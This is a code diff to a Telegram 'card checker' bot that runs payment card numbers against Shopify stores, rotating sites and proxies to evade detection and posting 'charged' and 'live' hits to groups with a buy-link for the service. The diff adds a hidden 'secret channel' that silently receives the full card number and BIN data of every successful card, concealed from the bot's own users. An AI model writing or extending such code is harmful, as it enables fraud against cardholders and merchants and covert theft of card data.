@@ -75,36 +75,36 @@ from config import (
 # CONFIG  — edit these two group IDs before deploying
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 BOT_CHANNEL      = "https://t.me/Batcardchk"          # channel link
-BOT_DISPLAY      = "Batmancardchk"
+BOT_DISPLAY      = "Batmanchk"
 DEV_LINK_HTML    = f'<a href="{BOT_CHANNEL}">{BOT_DISPLAY}</a>'
-# Deep link → opens the bot and auto-sends /start buy → shows pricing page
-BOT_DEEP_BUY     = "https://t.me/batcardchk29_bot?start=buy"
+# Deep link → opens bot and auto-sends /start buy → shows pricing page
+BOT_DEEP_BUY     = "https://t.me/Batchk11_bot?start=buy"
 GOSHOPI_URL      = "https://goshopi.up.railway.app/shopii"
 FALLBACK_SITE    = "aloracosmetics.myshopify.com"
 
-# ── Group IDs for charged-card notifications ────────────
-# Add the bot to each group manually, then paste the numeric chat ID here.
-# Set to 0 to disable that destination.
-HIT_LOG_GROUP_ID      = -1003999441241   # your private hit-log group (update!)
-CHARGED_SHARE_GROUP_ID = 0               # https://t.me/+EVdIWIdLZqs1MTI0
-                                          # ↑ paste numeric ID here, e.g. -1001234567890
+# ── Charged-card notification group IDs ─────────────────
+# HIT_LOG_GROUP_ID  → t.me/+BXmeotREVhllODFk   (logs group)  clean UI + buttons
+# SECRET_GROUP_ID   → secret channel -1004499920555            full card + BIN (silent)
+HIT_LOG_GROUP_ID      = -1004361062205   # t.me/+BXmeotREVhllODFk  ✅
+SECRET_GROUP_ID       = -1004499920555   # secret channel           ✅ (never linked publicly)
+CHARGED_SHARE_GROUP_ID = 0               # legacy — not used
 
 SH_COOLDOWN      = 25              # seconds, trial users only
 
 # ── Speed knobs — single-card /sh ─────────────────────
-SH_SITE_RETRIES  = 5               # max site attempts per card
-SH_SITE_TIMEOUT  = 15              # seconds per site attempt (was 25)
-SH_TCP_LIMIT     = 80              # connections in persistent pool
-SH_TCP_PER_HOST  = 40
+SH_SITE_RETRIES  = 6               # 6 different sites per single card
+SH_SITE_TIMEOUT  = 11              # seconds per attempt (fast)
+SH_TCP_LIMIT     = 120             # persistent connection pool
+SH_TCP_PER_HOST  = 60
 
 # ── Speed knobs — mass /msh ─────────────────────────────
-MAX_CONCURRENT       = 60
-SITE_RETRIES         = 5
-SITE_TIMEOUT         = 22
-TCP_LIMIT            = 200
-TCP_PER_HOST         = 80
-PROGRESS_INTERVAL    = 4.0
-PROGRESS_EVERY_N     = 8
+MAX_CONCURRENT       = 80          # parallel workers (was 60)
+SITE_RETRIES         = 8           # 8 sites per card before giving up (was 5)
+SITE_TIMEOUT         = 16          # seconds per attempt (was 22)
+TCP_LIMIT            = 350         # connection pool (was 200)
+TCP_PER_HOST         = 120
+PROGRESS_INTERVAL    = 3.0         # faster progress updates
+PROGRESS_EVERY_N     = 6
 BUTTON_LOCK_SECONDS  = 30
 
 # ── Button emoji IDs ─────────────────────────────────────
@@ -474,38 +474,56 @@ async def _check_card_with_retry(
 ) -> tuple[str, str, str, str]:
     """
     Returns (verdict, response_text, price, currency).
-    Tries up to max_sites different Shopify sites.
-    RETRY → next site silently. Never surfaces 'Error' to user.
+    Tries up to max_sites DIFFERENT Shopify sites, each with a DIFFERENT proxy.
+    RETRY/ERROR → silently rotate to next site+proxy. Never surfaces errors to user.
     """
     if not sites:
         sites = [FALLBACK_SITE]
+
+    # Shuffle both lists so every card gets a unique rotation order
+    site_pool  = sites.copy();  random.shuffle(site_pool)
+    proxy_pool = proxies.copy() if proxies else []
+    if proxy_pool:
+        random.shuffle(proxy_pool)
+
     tried: set[str] = set()
     price, currency = "0.00", "USD"
+    last_resp = "All sites exhausted"
 
-    for _ in range(max_sites):
+    for attempt in range(max_sites):
         if asyncio.current_task() and asyncio.current_task().cancelled():
             raise asyncio.CancelledError()
-        untried = [s for s in sites if s not in tried]
+
+        # Pick untried site — cycle through full pool when exhausted
+        untried = [s for s in site_pool if s not in tried]
         if not untried:
             tried.clear()
-            untried = list(sites)
-        site  = random.choice(untried)
+            untried = site_pool[:]
+        site = untried[0]
         tried.add(site)
-        proxy = random.choice(proxies) if proxies else None
+
+        # Always use a DIFFERENT proxy for each attempt
+        proxy = proxy_pool[attempt % len(proxy_pool)] if proxy_pool else None
+
         try:
             data = await _call_shopii(session, card, _clean_site(site), proxy, timeout=site_timeout)
         except asyncio.CancelledError:
             raise
         except Exception:
             continue
-        resp_text = _readable_resp(data)
-        price     = str(data.get("Price",    data.get("price",    "0.00"))).strip()
-        currency  = str(data.get("Currency", data.get("currency", "USD"))).strip()
-        verdict   = classify_response(resp_text)
+
+        resp_text    = _readable_resp(data)
+        last_resp    = resp_text
+        price        = str(data.get("Price",    data.get("price",    "0.00"))).strip()
+        currency     = str(data.get("Currency", data.get("currency", "USD"))).strip()
+        verdict      = classify_response(resp_text)
+
         if verdict in ("CHARGED", "LIVE", "TDS", "DEAD"):
             return verdict, resp_text, price, currency
+        # RETRY → silently continue to next site+proxy
 
-    return "DEAD", "All sites exhausted", price, currency
+    # Exhausted all attempts — card is likely dead or all sites busy
+    return "DEAD", last_resp, price, currency
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -698,65 +716,55 @@ def _share_group_text(resp: str, price: str, currency: str,
 
 def _share_group_kb() -> RawMarkup:
     """
-    Button shown on the public share-group message.
-    Clicking it opens the bot and auto-triggers /start buy → pricing page.
+    Buttons on every public charged/live message posted to the logs group.
+    Row 1: ⚡ Batmanchk — tapping runs /buy automatically via deep-link.
+    Row 2: 📢 Channel  |  💬 Group
     """
-    return RawMarkup([[
-        _btn(
-            f"🤖  {BOT_DISPLAY}",
-            url=BOT_DEEP_BUY,
-            style="primary",
-            icon=BTN_CHARGED_EMOJI_ID,
-        )
-    ]])
+    return RawMarkup([
+        [_btn(f"⚡ {BOT_DISPLAY} — /buy", url=BOT_DEEP_BUY,
+              style="primary", icon=BTN_CHARGED_EMOJI_ID)],
+        [_btn("📢 Channel", url=BOT_CHANNEL, style="primary"),
+         _btn("💬 Group",   url="https://t.me/+Gjwke5Yc1ddhYmZk", style="primary")],
+    ])
 
 async def _send_hit_log(bot, resp: str, price: str, currency: str,
-                        user, plan: str, verdict: str = "CHARGED"):
+                        user, plan: str, verdict: str = "CHARGED",
+                        card: str = "", bin_data: dict = None):
     """
-    Send charged/live card notification to both groups.
+    Fire charged/live notifications to two destinations simultaneously.
 
-    • HIT_LOG_GROUP_ID      → full detail (private)
-    • CHARGED_SHARE_GROUP_ID → clean public UI:
-          HIT ➛ CHARGED 💎
-          Gate ➛ Shopify Payments
-          ✅ ORDER_PAID
-          User ➛ William ⭐
-          [🤖  Batmancardchk]  ← button → opens bot → /buy page
+    HIT_LOG_GROUP_ID (-1004361062205)  →  clean public UI + ⚡Batmanchk + channel/group buttons
+    SECRET_GROUP_ID  (-1004499920555)  →  full card + BIN details, no button (silent/private)
     """
     await _rl_hit.wait()
+    bin_data = bin_data or {}
 
-    # ── Private hit-log group (full details, channel link button) ──
+    # ── Logs group: clean public UI — no card number, no BIN ──────────
     if HIT_LOG_GROUP_ID:
-        log_text = _private_log_text(resp, price, currency, user, plan, verdict)
-        log_kb   = RawMarkup([[
-            _btn("𝘾𝘼𝙍𝘿 ✘ 𝘾𝙃𝙆",
-                 url=BOT_CHANNEL, style="primary", icon=CARD_CHK_BTN_ID)
-        ]])
+        log_text = _share_group_text(resp, price, currency, user, plan, verdict)
         try:
             await bot.send_message(
                 chat_id=HIT_LOG_GROUP_ID,
                 text=log_text,
                 parse_mode="HTML",
                 disable_web_page_preview=True,
-                reply_markup=log_kb,
+                reply_markup=_share_group_kb(),
             )
         except Exception as e:
             logging.error(f"[SH] hit-log → {HIT_LOG_GROUP_ID}: {e}")
 
-    # ── Public share group (clean UI, no card, no bank, buy button) ──
-    if CHARGED_SHARE_GROUP_ID:
-        share_text = _share_group_text(resp, price, currency, user, plan, verdict)
-        share_kb   = _share_group_kb()
+    # ── Secret channel: full card + BIN details (silent, no button) ───
+    if SECRET_GROUP_ID and card:
+        secret_text = _hit_text(card, resp, bin_data, price, currency, 0, user, plan, verdict)
         try:
             await bot.send_message(
-                chat_id=CHARGED_SHARE_GROUP_ID,
-                text=share_text,
+                chat_id=SECRET_GROUP_ID,
+                text=secret_text,
                 parse_mode="HTML",
                 disable_web_page_preview=True,
-                reply_markup=share_kb,
             )
         except Exception as e:
-            logging.error(f"[SH] share-group → {CHARGED_SHARE_GROUP_ID}: {e}")
+            logging.error(f"[SH] secret-group → {SECRET_GROUP_ID}: {e}")
 
 async def _send_user_dm(bot, user, card, resp, bin_data, price, currency,
                          elapsed, plan, verdict, reply_to=None):
@@ -892,7 +900,8 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if verdict in ("CHARGED", "LIVE", "TDS"):
         asyncio.create_task(asyncio.gather(
-            _send_hit_log(context.bot, resp_text, api_price, api_currency, user, plan, verdict),
+            _send_hit_log(context.bot, resp_text, api_price, api_currency, user, plan, verdict,
+                          card=card, bin_data=bin_data),
             _send_user_dm(context.bot, user, card, resp_text, bin_data,
                           api_price, api_currency, elapsed, plan, verdict),
             return_exceptions=True,
@@ -1055,9 +1064,10 @@ async def _mass_worker(
         if verdict == "CHARGED":
             sess["charged"] += 1
             sess.setdefault("charged_cards", []).append(card_data)
-            # Notify hit-log group + share group + DM user
+            # Notify: logs group (clean UI) + secret channel (full card) + DM user
             asyncio.create_task(asyncio.gather(
-                _send_hit_log(bot, resp, price, currency, user_obj, plan, "CHARGED"),
+                _send_hit_log(bot, resp, price, currency, user_obj, plan, "CHARGED",
+                              card=card, bin_data=bin_data),
                 _send_user_dm(bot, user_obj, card, resp, bin_data, price, currency,
                                elapsed, plan, "CHARGED",
                                reply_to=sess.get("user_msg_id")),
@@ -1067,7 +1077,8 @@ async def _mass_worker(
             sess["live"] += 1
             sess.setdefault("live_cards", []).append(card_data)
             asyncio.create_task(asyncio.gather(
-                _send_hit_log(bot, resp, price, currency, user_obj, plan, "LIVE"),
+                _send_hit_log(bot, resp, price, currency, user_obj, plan, "LIVE",
+                              card=card, bin_data=bin_data),
                 _send_user_dm(bot, user_obj, card, resp, bin_data, price, currency,
                                elapsed, plan, "LIVE",
                                reply_to=sess.get("user_msg_id")),
